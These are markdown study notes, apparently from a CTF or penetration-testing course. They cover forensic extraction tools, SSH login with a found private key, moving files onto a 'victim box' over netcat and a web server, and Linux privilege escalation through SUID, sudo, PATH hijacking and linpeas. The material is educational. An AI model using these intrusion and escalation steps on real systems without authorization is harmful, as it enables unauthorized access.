---
layout: default
title: "Sessions 3 & 4"  # What shows in the sidebar
parent: "Sessions" # e.g., Enumeration
nav_order: 3           # Position in the list
---

# Sessions 3 & 4

## Curl

- can use to download file in web server onto local machine

`curl  --path-as-is (online file) --output (local file)`

---

## Forensic Extraction

### File

- helps identify image type using its header

Command: `file (file)`

### Exiftool

- shows metadata information of a file
    - ex: large size —> extract files within

Command: `exiftool (file)`

### Binwalk

- extracts embedded files in data using magic bytes/signatures

Command: `binwalk -e (file)`

### Strings

- shows plaintext info in a file
    - may reveal SSH keys, passwords, etc.

Command: `strings (file)`

### Foremost

- recovers disk/memory dump files
    - use especially on memory captures and disk dumps

Command: `foremost -i (file) -o (output_dir)`

---

## SSH

- can authenticate to remote servers using two methods:

### Standard (User/password):

- Command: `ssh (username)@(IP) -p (port)`
- default port = 22

### Public Key:

- use when we find a user’s id_rsa private key
1. Copy/download file if necessary
2. Add permissions:
    1. `chmod 600 id_rsa`
3. Connect via SSH:
    1. `ssh -i (private key file) (username)@(IP)`

---

## Transferring Files From Local Machine to Remote Box (Linux)

### Method 1: Python Web Server

1. Go to directory w/ file to upload
2. Start web server on kali attack machine
    
    `python -m http.server 80`
    
3. use wget/curl to download file 
    
    `wget http://(IP)/(file)`

### Method 2: Netcat

1. open netcat listener and send file on attack machine
    
    `nc -lnvp 4444 > (file)`
    
2. connect to listener and download file on victim box
    
    `nc (IP) 4444 < (file)`
    

### Method 3: SCP

- can use when we have SSH key/credentials, and connect to SSH server on remote machine

1. On Kali Attack Machine, push file:
    
    `scp (file) (username)@(IP):/tmp/`
    
    - add `-i (private key)` at end if using PKA, insert before `(file)`

### Method 4: Clipboard

- use this only for ascii text

1. On Kali Attack machine, copy file into clipboard:
    
    `cat (file) | xclip -selectip clipboard`
    
2. On Victim Box, create new file and paste clipboard

{: .note }
> Download files into `/tmp` or `/dev/shm` on box, where everyone has write/execute permissions.

---

## GTFOBins

https://gtfobins.org/

- Website with Linux binaries and methods of abusing them
- Usually for privilege escalation when we initially inherit shell

We can use this on 3 main types of vulnerable binaries:

### 1. SUID Binaries

- SUID = file which always executes with the permission of file owner
- Command to find SUID Binaries: 
`find / -perm -4000 2>/dev/null`

### 2. SUDO Binaries

- `sudo -l`, elaborated in Other

### 3. Path Hijacking

- If there are any path variables that are writable, and used by high-privilege process elsewhere, we can modify this to point to our own code.

- `echo $PATH` , check for write permissions

---

## Linpeas

- Privilege Escalation Script on low-privilege shell, scans for:
    - Sudo, SUID, Path Hijacking files/directories
    - Sensitive Files
    - Kernel Exploits
    - more …
- check for RED/YELLOW or RED vulnerabilities
- located in `/usr/share/peass/linpeas/`

---

## Other

- `sudo -l`
    - when we get initial shell, this command will show what binaries we have sudo permission on!
- `2>/dev/null`
    - silences error messages to keep terminal clean
- use `bash` command to execute files
- look for unknown suid binaries in linpeas script!
- `adm` group:
    - group of users that can read log files in `/var/log`
    - use `id` command to check for this
- `pkexec` = allows users to execute commands as root, alternative to sudo
    - SUID binary owned by root
- Sockets: Endpoints of connections, which are defined by an IP Address and Port
- DBus: Central Point of communication used when programs try to communicate with each other in system. The dbus-daemon routes incoming program communication, and sends to the correct destination.

